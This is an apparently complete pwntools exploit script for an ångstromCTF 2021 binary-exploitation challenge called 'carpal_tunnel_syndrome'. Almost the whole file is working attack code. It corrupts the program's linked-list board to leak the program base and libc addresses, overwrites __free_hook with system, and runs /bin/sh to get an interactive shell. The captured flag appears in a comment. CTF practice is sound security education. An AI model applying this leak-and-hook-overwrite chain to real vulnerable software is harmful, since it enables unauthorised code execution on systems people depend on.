#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host pwn.2021.chall.actf.co --port 21840 carpal_tunnel_syndrome
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('carpal_tunnel_syndrome')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'pwn.2021.chall.actf.co'
port = int(args.PORT or 21840)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

'''
the struct
marker (raw characters)
pointer to entry to the right (next x)
pointer to entry below (next y)
pointer to entry string
'''

libc = ELF('./libc.so.6')
io = start(env={'LD_PRELOAD': './libc.so.6'})

def mark_slot(x: int, y: int):
    io.sendlineafter('Choice: ', '1')
    io.sendlineafter('x and y', f'{x} {y}')

def view_board(x: int, y: int):
    io.sendlineafter('Choice: ', '2')
    io.sendlineafter('x and y', f'{x} {y}')
    io.recvuntil('Slot at')
    io.recvuntil(': ')

def reset(i: int, rowcolumn: str):
    assert rowcolumn == 'r' or rowcolumn == 'c'
    io.sendlineafter('Choice: ', '3')
    io.sendlineafter('Index', str(i))
    io.sendlineafter('(r)', rowcolumn)

def checkspecificbingo(i: int, rowcolumn: str):
    assert rowcolumn == 'r' or rowcolumn == 'c'
    io.sendlineafter('Choice: ', '4')
    io.sendlineafter('Index', str(i))
    io.sendlineafter('(r)', rowcolumn)

def check_bingos():
    io.sendlineafter('Choice: ', '5')

def change_marker(new_marker):
    io.sendlineafter('Choice: ', '6')
    io.sendafter('New marker', new_marker)

def win(name: str, length: int):
    global io
    io.sendlineafter('delete the row (y/n)', 'y')
    io.sendlineafter('Length', str(length))
    io.sendafter('Name', name)

io.sendlineafter('marker', 'test')

for x in range(0, 5):
    mark_slot(x, 4)

check_bingos()
win(b'a'*0x18, 0x20-1)
io.recvuntil('a'*0x18)
exe.address = u64(io.recv(6) + b'\x00\x00') - 0x3074 - 0x1bc
log.info(f'Program base: {hex(exe.address)}')

for x in range(0, 5):
    view_board(x, 1)
    mark_slot(x, 1)
# reset(0, 'r')
# for x in range(0, 5):
#     mark_slot(x, 0)
# check_bingos()

to_leak = exe.sym['stdout']
new_marker = p64(0)*2 + p64(to_leak)
change_marker(new_marker)
check_bingos()
win(p64(0xdeadbeefdeadbeef)*2 + p64(exe.sym['marker']-8), 0x20-1)
view_board(2, 2)
libc.address = u64(io.recv(6) + b'\x00\x00') - (0x7fc315e146a0 - 0x00007fc315c28000)
log.info(f'Libc leak: {hex(libc.address)}')

new_marker = p64(libc.sym['system']) + p64(libc.sym['__free_hook']) + p64(libc.sym['__free_hook'])
change_marker(new_marker)
mark_slot(2, 3)

new_marker = b'/bin/sh\x00'
change_marker(new_marker)

for x in range(0, 5):
    mark_slot(x, 0)
check_bingos()

# actf{whenever_dark_has_fallen_you_know_the_spirit_of_the_party_starts_to_come_alive_until_the_linkedlist_is_corrupted_86cd89dc33b2bbc691af4857}
io.interactive()

